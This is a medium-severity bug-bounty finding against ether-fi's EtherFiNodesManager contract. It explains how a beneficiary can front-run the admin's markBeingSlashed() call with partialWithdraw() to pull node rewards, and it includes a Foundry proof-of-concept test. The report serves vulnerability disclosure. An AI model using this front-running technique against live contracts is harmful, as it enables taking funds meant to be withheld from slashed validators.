# [M] Beneficiaries of a slashed validator can still withdraw their node rewards

## Summary
Severity: Medium
Chain: Smart contract
Component: ether-fi
Published: 2023-11-13
Source: https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/issues/53
Type: hats-finding

## Details
**Github username:** @0xfuje
**Twitter username:** 0xfuje
**Submission hash (on-chain):** 0x55f643f3d2b3a8cbccec64be6e17f9eea232383f4d4d95db86d8ad37eb4ef46e
**Severity:** medium

**Description:**
## Description
The admin can mark an `EtherFiNode` as slashed via `EtherFiNodeManager` - `markBeingSlashed()`. When a validator is slashed, they are not supposed to withdraw their node rewards: however a beneficiary of rewards can still withdraw (if the node's balance is below 8 ether) via front-running `markBeingSlashed()` and calling `partialWithdraw()`.

`src/EtherFiNodeManager.sol` - [`markBeingSlashed()`](https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/blob/master/src/EtherFiNodesManager.sol#L279-L288)
```solidity
    function markBeingSlashed(
        uint256[] calldata _validatorIds
    ) external whenNotPaused onlyAdmin {
        for (uint256 i = 0; i < _validatorIds.length; i++) {
            address etherfiNode = etherfiNodeAddress[_validatorIds[i]];
            IEtherFiNode(etherfiNode).markBeingSlashed();

            emit PhaseChanged(_validatorIds[i], IEtherFiNode.VALIDATOR_PHASE.BEING_SLASHED);
        }
    }
```


When `markBeingSlashed()` is front-runned the actual phase will still be `VALIDATOR_PHASE.LIVE` instead of `VALIDATOR_PHASE.BEING_SLASHED`.

`src/EtherFiNodeManager.sol` - [`partialWithdraw()`](https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/blob/master/src/EtherFiNodesManager.sol#L204-L230)
```solidity
function  partialWithdraw(uint256 _validatorId) public nonReentrant whenNotPaused {
	...
	require(
		IEtherFiNode(etherfiNode).phase() == IEtherFiNode.VALIDATOR_PHASE.LIVE ||
		IEtherFiNode(etherfiNode).phase() == IEtherFiNode.VALIDATOR_PHASE.FULLY_WITHDRAWN,
		"Must be LIVE or FULLY_WITHDRAWN."
	);
	...
}
```

## Proof of Concept
1. navigate to `test/EtherFiNode.t.sol`
2. copy the below proof of concept inside the test contract
3. run `forge test --match-test test_WithdrawBeforeSlash_0xfuje -vvvv`
```solidity
    function test_WithdrawBeforeSlash_0xfuje() public {
        address etherfiNode = managerInstance.etherfiNodeAddress(bidId[0]);
        address nodeOperator = 0xCd5EBC2dD4Cb3dc52ac66CEEcc72c838B40A5931;
        address staker = 0x9154a74AAfF2F586FB0a884AeAb7A64521c64bCf;

        vm.deal(etherfiNode, 4 ether);
        assertEq(etherfiNode.balance, 4 ether);
        uint256 beneficiariesBalanceBefore = address(treasuryInstance).balance +
            nodeOperator.balance + dan.balance + staker.balance;

        // 2. dan front-runs the slash transaction
        // to withdraw from the node
        vm.prank(dan);
        managerInstance.partialWithdraw(bidId[0]);

        uint256 beneficiariesBalanceAfter = address(treasuryInstance).balance +
            nodeOperator.balance + dan.balance + staker.balance;

        uint256 beneficiariesGain = beneficiariesBalanceAfter - beneficiariesBalanceBefore;

        // 3. succesfully withdrawn full balance
        assertEq(etherfiNode.balance, 0);
        assertEq(beneficiariesGain, 4 ether);

        // 1. alice marks validator as slashed
        hoax(alice);
        managerInstance.markBeingSlashed(bidId);
    }
```
